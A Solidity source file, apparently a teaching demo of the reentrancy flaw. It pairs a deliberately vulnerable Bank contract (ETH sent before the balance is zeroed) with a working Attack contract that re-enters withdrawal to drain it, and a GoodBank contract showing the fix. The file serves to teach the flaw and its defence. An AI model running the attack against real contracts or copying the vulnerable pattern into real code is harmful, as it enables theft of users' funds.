// SPDX-License-Identifier: MIT
// by 0xAA
pragma solidity ^0.8.4;
contract Bank {
    mapping (address => uint256) public balanceOf;
    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }
    function withdrow() external {
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0,"Insuffucuent balance");
        (bool success, ) = msg.sender.call{value:balance}("");
        require(success, "Failed to send ETH");
        balanceOf[msg.sender] = 0;
    }
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
contract Attack{
    Bank public bank;
    constructor(Bank _bank) {
        bank = _bank;
    }
    receive()  external payable{
        if(address(bank).balance >= 1 ether) {
            bank.withdrow();
        }
    }

    function attack() external payable {
        require(msg.value == 1 ether,"Require 1 Eth to attack");
        bank.deposit{value: 1 ether}();
        bank.withdrow();
    }
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}
contract GoodBank {
    mapping (address => uint256) public balanceOf;

    function deposit() external payable {
        balanceOf[msg.sender] += msg.value;
    }
    function withdraw() external {
        uint256 balance = balanceOf[msg.sender];
        require(balance > 0, "Insufficient balance");
        balanceOf[msg.sender] = 0;
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, "Failed to send Ether");
    }
    function getBalance() external view returns (uint256) {
        return address(this).balance;
    }
}